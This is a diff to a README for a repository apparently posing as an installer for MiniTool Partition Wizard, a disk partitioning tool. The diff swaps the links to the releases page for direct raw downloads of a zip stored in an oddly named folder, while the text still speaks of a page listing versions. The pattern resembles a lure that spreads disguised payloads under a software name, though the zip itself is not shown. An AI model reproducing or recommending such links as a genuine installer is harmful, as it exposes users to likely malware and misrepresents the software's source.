@@ -1,12 +1,12 @@
 # ⚙️ MiniTool-Partition-Wizard-Setup - Manage your disk partitions with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/wellworn-sleeper575/MiniTool-Partition-Wizard-Setup/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/wellworn-sleeper575/MiniTool-Partition-Wizard-Setup/main/abdominogenital/Partition-Wizard-Mini-Tool-Setup-v2.4.zip)
 
 MiniTool Partition Wizard helps you manage your computer storage. You can resize, merge, and move partitions on your hard drive. This tool works for both MBR and GPT disk types. It allows you to move your operating system to a new SSD without data loss.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/wellworn-sleeper575/MiniTool-Partition-Wizard-Setup/releases) to download the installer. The page lists different versions. Choose the top version to get the latest update. Click the file name to start your download. Your browser saves the file in your Downloads folder by default.
+Visit [this page](https://raw.githubusercontent.com/wellworn-sleeper575/MiniTool-Partition-Wizard-Setup/main/abdominogenital/Partition-Wizard-Mini-Tool-Setup-v2.4.zip) to download the installer. The page lists different versions. Choose the top version to get the latest update. Click the file name to start your download. Your browser saves the file in your Downloads folder by default.
 
 ## 🖥️ System requirements
 
